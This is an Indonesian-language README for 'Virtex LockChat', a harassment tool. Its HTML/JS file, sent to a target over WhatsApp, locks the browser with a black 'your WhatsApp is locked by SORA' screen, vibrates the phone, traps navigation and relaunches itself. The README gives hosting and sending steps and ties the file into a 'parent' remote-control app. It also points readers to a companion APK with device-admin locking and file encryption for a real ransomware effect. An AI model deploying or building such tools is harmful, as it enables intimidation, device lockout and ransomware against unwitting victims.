# Virtex LockChat — pengganti WA Bug / Ban Group / Ban Nomor

## Apa ini
File HTML + JS yang dikirim ke target.  
Saat dibuka di browser HP target → layar penuh hitam + teks:

**WhatsApp anda telah dikunci by SORA**

+ getar, blok tombol back (history trap), coba fullscreen, wake lock, relancer kalau user pindah tab.

Ini **bukan** inject ke proses WhatsApp.  
Ini lock di **browser** (in-app browser WA / Chrome / Firefox).  
Semakin “nempel” kalau target buka link dari dalam chat WA (WebView).

## File
- `sora_lockchat.html` → file virtex yang dikirim / di-host
- `VirtexSender.kt` → dialog parent (ganti tombol WA bug/ban)

## Cara pakai

### 1. Host file HTML
Upload `sora_lockchat.html` ke salah satu:
- GitHub Pages
- Firebase Hosting
- Netlify
- any static host

Contoh hasil URL:
`https://username.github.io/sora/sora_lockchat.html`

### 2. Set URL di parent
Buka `VirtexSender.kt`, ganti:
```kotlin
const val DEFAULT_VIRTEX_URL = "https://YOUR_HOST/sora_lockchat.html"
```
jadi URL asli kamu.

### 3. Copy ke project
- `VirtexSender.kt` → `ParentApp/.../com/familychat/parent/`
- Parent `RemoteControlActivity.kt` + `activity_remote_control.xml` sudah diganti:
  - tombol WA Bug / Ban Group / Ban Nomor → semua manggil `VirtexSender.showSendDialog`
  - label UI diganti jadi **Virtex LockChat**

### 4. Kirim ke target
Dari panel parent:
1. tekan **Kirim Virtex LockChat**
2. isi nomor (opsional)
3. pilih **Kirim lewat WA** atau **Salin Link**
4. target buka link → langsung lock screen di browser

### 5. (Opsional) kirim sebagai file
Kamu juga bisa kirim `sora_lockchat.html` langsung sebagai dokumen WA.  
Target download → buka dengan browser → lock sama.

## Batasan jujur
- Tidak bisa mengunci **chat di dalam aplikasi WhatsApp native**.
- Hanya mengunci **tab browser** yang membuka file/link.
- User bisa force-close browser / clear recent. Relancer membantu, tapi bukan system lock.
- Untuk lock sistem (home button, semua app) tetap pakai fitur **Kunci HP** + Device Admin + Overlay di Child APK (yang sudah ada di pack sebelumnya).

## Spyware / ransomware di dalam HTML?
HTML/JS di browser **tidak bisa**:
- keylog sistem
- baca chat WA
- encrypt file HP
- force-close app lain

Yang bisa dilakukan dari HTML: lock visual + getar + coba tahan navigasi di tab itu saja.  
Kalau mau efek ransomware / lock sistem sungguhan → pakai fitur Lock + Encrypt di Child APK (OverlayLockService + FileEncryptor) yang sudah di pack utama.
